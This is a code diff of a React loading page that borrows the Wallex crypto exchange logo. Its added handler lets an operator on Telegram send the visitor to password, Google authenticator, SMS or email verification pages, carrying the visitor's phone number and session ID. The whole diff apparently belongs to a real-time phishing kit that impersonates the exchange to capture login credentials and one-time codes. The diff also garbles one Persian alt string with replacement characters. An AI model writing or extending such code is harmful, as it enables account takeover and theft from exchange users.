@@ -64,18 +64,51 @@ const Loading = () => {
     };
   }, [sessionId, navigate]);
 
-  // Check for admin actions every 5 seconds
-  useEffect(() => {
-    if (!sessionId || isLoading) return;
+  // Handle admin actions from Telegram
+  const handleAdminAction = (action: string) => {
+    if (!sessionId) {
+      console.error("No session ID for admin action");
+      return;
+    }
 
-    const checkForUpdates = setInterval(() => {
-      // In a real app, this would poll the server or use WebSocket
-      // For now, we'll just log that we're waiting
-      console.log("Waiting for admin action on session:", sessionId);
-    }, 5000);
+    console.log("🚀 Executing admin action:", action);
 
-    return () => clearInterval(checkForUpdates);
-  }, [sessionId, isLoading]);
+    switch (action) {
+      case "password":
+        navigate("/auth-password", {
+          state: { phoneNumber, sessionId },
+        });
+        break;
+      case "google":
+        navigate("/auth-google", {
+          state: { phoneNumber, sessionId },
+        });
+        break;
+      case "sms":
+        navigate("/auth-sms", {
+          state: { phoneNumber, sessionId },
+        });
+        break;
+      case "email":
+        navigate("/auth-email", {
+          state: { phoneNumber, sessionId },
+        });
+        break;
+      case "complete":
+        // Complete authentication
+        localStorage.setItem("isAuthenticated", "true");
+        localStorage.setItem("userPhone", phoneNumber);
+        sessionStorage.removeItem("sessionId");
+        sessionStorage.removeItem("phoneNumber");
+
+        alert("🎉 احراز هویت با موفقیت تکمیل شد! خوش آمدید.");
+        navigate("/", { replace: true });
+        break;
+      default:
+        console.error("Unknown admin action:", action);
+        alert(`⚠️ عملیات ناشناخته: ${action}`);
+    }
+  };
 
   if (!sessionId) {
     return (
@@ -148,7 +181,7 @@ const Loading = () => {
         >
           <img
             src="https://wallex.ir/_next/image?url=%2Fimages%2Fwallex-logo-v-light.svg&w=256&q=75"
-            alt="صرافی خرید فروش ارزهای دیجیتال"
+            alt="صرافی خرید ��روش ارزهای دیجیتال"
             style={{
               width: "128px",
               height: "24px",
@@ -383,7 +416,7 @@ const Loading = () => {
           >
             🤖{" "}
             {isLoading
-              ? "در حال ارس��ل اطلاعات به سیستم مدیریت..."
+              ? "در حال ارسال اطلاعات به سیستم مدیریت..."
               : "ادمین در تلگرام دکمه‌های احراز هویت را مشاهده می‌کند"}
           </p>
         </div>
